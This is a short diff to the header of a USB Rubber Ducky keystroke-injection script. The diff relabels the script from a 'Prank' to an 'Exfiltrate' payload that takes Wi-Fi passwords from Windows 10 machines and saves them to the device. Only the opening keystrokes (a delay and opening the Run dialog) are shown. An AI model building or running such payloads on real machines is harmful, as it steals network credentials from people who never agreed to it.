@@ -1,10 +1,9 @@
 REM	=============================================================================================================
-REM 	Title: pass wifi
+REM 	Title: Exfiltrate Wifi Password Locally
 REM 	Author: Mr.Cricket
-REM 	Description: xxx
+REM 	Description: This Payload Exfiltrates wifi passwords and store in the UsbRubberDucky (View ss.ps1 to change the directory)
 REM 	Target: Windows 10
-REM 	Category: Prank
-REM	You can change the delay when the windows to minimize, 1 Second = 1000 Milliseconds. Change on "dd.ps1"
+REM 	Category: Exfiltrate
 REM	==============================================================================================================
 DELAY 5000
 GUI r
